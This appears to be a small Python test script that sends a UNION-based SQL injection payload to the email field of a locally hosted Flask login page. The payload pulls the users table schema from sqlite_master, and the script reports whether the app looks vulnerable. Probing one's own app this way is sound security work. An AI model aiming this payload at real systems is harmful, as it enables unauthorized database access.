import requests

# Set the target URL where the Flask app is running
TARGET_URL = "http://127.0.0.1:5000/login"

# Payloads for column discovery and data extraction
sql_injections = [
    "' UNION SELECT NULL, name, sql, NULL FROM sqlite_master WHERE type='table' AND name='users' --",
]

def test_sql_injections():
    # Headers for the POST request
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    # Iterate over each SQL injection payload
    for payload in sql_injections:
        data = {
            "email": payload,
            "password": "any_password"  # Password field can be anything since injection is only in the email field
        }
        
        # Send POST request with the payload
        response = requests.post(TARGET_URL, headers=headers, data=data)
        
        # Check if the response contains a valid login or column data
        if "Welcome" in response.text or "users" in response.text or "email" in response.text:
            print(f"[+] Vulnerable to SQL Injection: '{payload}'")
            print(f"Response: {response.text[:500]}...")  # Print a snippet of the response
        else:
            print(f"[-] Not vulnerable with payload: '{payload}'")

if __name__ == "__main__":
    test_sql_injections()
